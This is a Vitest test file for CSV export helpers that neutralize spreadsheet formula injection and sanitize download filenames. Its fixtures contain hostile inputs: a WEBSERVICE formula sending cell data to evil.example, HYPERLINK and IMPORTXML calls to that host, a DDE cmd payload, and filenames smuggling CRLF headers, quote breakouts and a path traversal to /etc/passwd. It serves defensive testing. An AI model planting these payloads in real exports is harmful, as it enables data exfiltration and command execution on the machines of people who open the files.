import { describe, expect, it } from "vitest";

import { csvCell, csvFilename, csvRow } from "@/lib/bff/csv";

/**
 * Both CSV download routes previously did RFC-4180 quoting and nothing else, so
 * a golden-record value beginning `=`, `+`, `-` or `@` reached the file verbatim
 * and a spreadsheet evaluated it. Golden records derive from tenant-uploaded
 * source files, so the value is attacker-reachable; the person who opens the
 * export is usually an admin on their own workstation.
 */

const TAB = String.fromCharCode(0x09);
const CR = String.fromCharCode(0x0d);
const LF = String.fromCharCode(0x0a);

describe("csvCell — formula neutralization", () => {
  describe("defuses cells a spreadsheet would evaluate", () => {
    it.for([
      '=HYPERLINK("http://evil.example","click me")',
      '=WEBSERVICE("http://evil.example/"&A1)',
      "=1+1",
      "=cmd|' /C calc'!A0",
      "+1+1",
      "+SUM(A1:A9)",
      "-1+1",
      "@SUM(1)",
      '=IMPORTXML("http://evil.example","//a")',
    ] as const)("%s", (payload) => {
      const cell = csvCell(payload);
      // The apostrophe is what stops evaluation; it must be the first character
      // of the emitted field (inside the quotes when quoting applies).
      expect(cell.replace(/^"/, "").startsWith("'")).toBe(true);
    });
  });

  it("defuses TAB- and CR-led payloads, which Excel strips before evaluating", () => {
    expect(csvCell(`${TAB}=1+1`)).toContain("'");
    expect(csvCell(`${CR}=1+1`)).toContain("'");
  });

  // The reason the guard is not a blanket prefix on `-` and `+`: that would
  // corrupt every negative number in an export for no security gain.
  describe("leaves plain numbers intact", () => {
    it.for(["-5", "-5.25", "+5", "-0", "1e6", "-1e-6", "0"] as const)("%s", (number) => {
      expect(csvCell(number)).toBe(number);
    });
  });

  it("still neutralizes something that only looks numeric", () => {
    expect(csvCell("-5+cmd")).toBe("'-5+cmd");
    expect(csvCell("-1-2-3abc")).toBe("'-1-2-3abc");
  });

  it("leaves ordinary values alone", () => {
    expect(csvCell("Ada Lovelace")).toBe("Ada Lovelace");
    expect(csvCell("ada@example.com")).toBe("ada@example.com"); // @ is not leading
    expect(csvCell("")).toBe("");
  });

  describe("RFC-4180 quoting is preserved", () => {
    it("quotes and doubles embedded quotes", () => {
      expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    });
    it("quotes values containing the delimiter", () => {
      expect(csvCell("Lovelace, Ada")).toBe('"Lovelace, Ada"');
    });
    it("quotes values containing a line break", () => {
      expect(csvCell(`10 Main St${LF}Apt 2`)).toBe(`"10 Main St${LF}Apt 2"`);
      expect(csvCell(`a${CR}b`)).toBe(`"a${CR}b"`);
    });
    it("quotes a neutralized value that also needs quoting", () => {
      expect(csvCell('=HYPERLINK("a","b")')).toBe('"\'=HYPERLINK(""a"",""b"")"');
    });
  });

  describe("value coercion", () => {
    it("renders null and undefined as empty", () => {
      expect(csvCell(null)).toBe("");
      expect(csvCell(undefined)).toBe("");
    });
    it("joins arrays with the list separator", () => {
      expect(csvCell(["a", "b", "c"])).toBe("a;b;c");
      expect(csvCell(["a", "b"], "|")).toBe("a|b");
    });
    it("neutralizes a joined array whose first element is a formula", () => {
      expect(csvCell(["=1+1", "b"])).toBe("'=1+1;b");
    });
    it("renders primitives and JSON-stringifies anything else", () => {
      expect(csvCell(42)).toBe("42");
      expect(csvCell(true)).toBe("true");
      expect(csvCell({ a: 1 })).toBe('"{""a"":1}"');
    });
  });
});

describe("csvRow", () => {
  it("joins cells with commas, each independently neutralized", () => {
    expect(csvRow(["ok", "=1+1", null, "Lovelace, Ada"])).toBe('ok,\'=1+1,,"Lovelace, Ada"');
  });
});

describe("csvFilename", () => {
  it("passes a normal org-derived stem through", () => {
    expect(csvFilename("segment-acme-dev")).toBe("segment-acme-dev");
    expect(csvFilename("pre-merge-acme-dev-recency")).toBe("pre-merge-acme-dev-recency");
  });

  it("cannot break out of the quoted content-disposition value", () => {
    expect(csvFilename('segment-a"; filename="evil')).not.toContain('"');
    expect(csvFilename(`segment-a${CR}${LF}X-Evil: 1`)).not.toContain(CR);
    expect(csvFilename("segment-../../etc/passwd")).not.toContain("/");
  });

  it("falls back rather than emitting an empty filename", () => {
    expect(csvFilename("")).toBe("export");
    expect(csvFilename("///")).toBe("---");
  });

  it("caps the length", () => {
    expect(csvFilename("a".repeat(500)).length).toBe(100);
  });
});
